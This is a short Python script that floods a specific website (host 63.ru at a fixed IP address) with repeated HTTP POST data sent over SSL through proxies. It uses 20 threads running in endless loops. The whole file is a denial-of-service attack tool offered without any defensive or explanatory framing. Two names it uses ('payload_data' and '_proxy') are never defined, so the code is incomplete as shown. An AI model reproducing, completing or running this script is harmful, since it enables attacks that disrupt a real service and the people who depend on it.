import random
import string
import ssl
import requests
import socks
import threading

PAYLOAD = b"POST / HTTP/1.1\r\nConnection: Keep-alive\r\n" \
          b"Accept: */*\r\n" \
          b"User-Agent: Mozilla/5.0 (Linux; Android 9.0; Redmi Note 7 Build/PKQ1.180904.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.111 Mobile Safari/537.36\r\n" \
          b"Cache-Control: no-cache\r\n" \
          b"Host: 63.ru\r\n"


def worker(proxy):
    ip, pport = proxy.split(":")[0], int(proxy.split(":")[1])
    while True:
        try:
            s = socks.socksocket()
            s.set_proxy(socks.HTTP, ip, pport)
            s.connect(("195.19.220.27", 443))
            s = ssl.wrap_socket(s)
            send = f"Content-Length: 1000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n".encode() + payload_data
            while True:
                try:
                    s.send(send * 120)
                except Exception:
                    break
            s.close()
        except Exception:
            continue


for _ in range(20):
    threading.Thread(target=worker, args=(_proxy,)).start()

while True:
    pass
